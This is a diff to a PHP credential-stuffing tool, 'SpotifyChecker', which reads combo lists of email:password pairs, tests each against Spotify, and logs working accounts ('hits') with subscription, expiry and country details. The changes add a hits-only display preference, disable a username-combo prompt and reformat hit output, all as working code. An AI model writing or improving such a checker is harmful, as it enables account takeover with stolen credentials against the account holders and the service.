@@ -2,8 +2,8 @@
 <?php
 /*
 * Created by @Voldemort1912
-* Last Update: 14/03/2019
-* Time: 1800
+* Last Update: 28/03/2019
+* Time: 1330
 * Telegram @hewhomustnotbenamed
 */
 
@@ -33,6 +33,18 @@ if ($firstrun == 'true'){
 	sleep(3);
 	echo "\n[i] The Dependencies Have Been Installed Successfully!!";
 	echo "\n[i] The Program has Been Installed Successfully!";
+	echo "\n[i] Initiating Setup!!";
+	sleep(3);
+	
+	echo "\n\033[51;33;1m[i] Show Only Hits ??  Type \033[01;32;1m'yes'\033[51;33;1m/\033[01;31m'no'\033[51;33;1m : \033[0m ";
+	$conhan = fgets(fopen("php://stdin", "rb"));
+
+	if (trim($conhan) == 'yes'){
+		file_put_contents('.pref', '1');	//Hitsonly
+	} else {
+		file_put_contents('.pref', '0');	//all
+	}
+	
 	echo "\n[i] Please Restart the Program to See the Changes";
 	echo "\n[i] Press Enter to Exit...";
 	fgetc(STDIN);
@@ -58,6 +70,13 @@ echo "[•]Thank You to all the Testers!! and StackOverflow.\n\033[0m";
 sleep(2);
 include ('class.spotify.php');
 
+	if(is_file('.pref')){
+		$hitpref = trim(file_get_contents('.pref'));
+	} else {
+		$hitpref = '0';
+	}
+	
+
 //Check Updates
 $glo_ver = trim(file_get_contents('https://raw.githubusercontent.com/VoldemortCommunity/SpotifyChecker/master/.version'));
 $loc_ver = trim(file_get_contents('.version'));
@@ -72,7 +91,6 @@ if($glo_ver > $loc_ver){
 	if (trim($ln) == 'yes'){
 		echo "\033[05;32;1m[i] Updating Now...\n[i] Press Enter to Start...\033[0m";
 		fgetc(STDIN);
-		system('rm -rf .first');
 		system('git reset --hard');
 		system('git pull origin master');
 		echo "\033[01;32;1m[i] Update Complete!! Please Restart to see Changes!!";
@@ -108,14 +126,14 @@ if(!is_file($inpnam)){
 }
 $lines = file(trim($inpnam));
 
-//get ComboList Type
+/*//get ComboList Type
 echo "\n \n\033[01;32;1m[i]Enter Combo List Type:\n \n[1] Email:Password\n \n[2] Username:Password\n \nResponse[1/2]:\033[0m ";
 $comtype = fgets(fopen("php://stdin", "r"));
 if (trim($comtype) == '2'){
 	echo "\n\033[05;31m[i]ABORT.\n[i]This Feature Has Been Discontinued.\n[i]Contact \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram) for Details.\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
 	fgetc(STDIN);
 	exit;
-}
+}*/
 
 //Saving Hits
 echo "\n\033[51;33;1m[i] Enter File Name to Save Hits : \033[0m";
@@ -146,13 +164,23 @@ foreach((array) $lines as $line) {
 	if($dec["status"]==true){
 		$count++;
 		echo "\033[01;32;1m";
-		file_put_contents($file, "[!]Email ID : ".$usernn."\n[!]Password : ".$inppass."\n[i]SpotifyChecker by @hewhomustn0tbenamed (Telegram)!!\n[!]".$res."\n\n", FILE_APPEND);
 	} else {
 		echo "\033[01;31m";
 	}
-	echo "[!]Username : " . $usernn . "\n"; 
-	echo "[!]Password : " . $inppass . "\n";
-	echo "[!]" . $res . "\n\n\033[0m";
+	
+	if ($dec['status'] == true){
+		echo "[!] Email ID : " . $usernn . "\n"; 
+		echo "[!] Password : " . $inppass . "\n";
+		echo "[!] Subscription : " . $dec['subscription'] . "\n";
+		echo "[!] Validity : " . $dec['expdate'] . "\n";
+		echo "[!] Country : " . $dec['ip'] . "\n\n\n\033[0m";
+		file_put_contents($file, "[!] Email ID : ".$usernn."\n[!] Password : ".$inppass."\n[!] Subscription : " . $dec['subscription'] . "\n[!] Validity : " . $dec['expdate'] . "\n[!] Country : " . $dec['ip'] . "\n[i] SpotifyChecker by @hewhomustn0tbenamed (Telegram)!!\n\n", FILE_APPEND);
+	} else if($hitpref == '0'){
+		echo "[!] Email ID : " . $usernn . "\n"; 
+		echo "[!] Password : " . $inppass . "\n";
+		echo "[!] Invalid Account! \n";
+		echo "[!] " . $dec['error'] . "\n\n\n\033[0m";
+	}
 	$combocount++;
 }
 
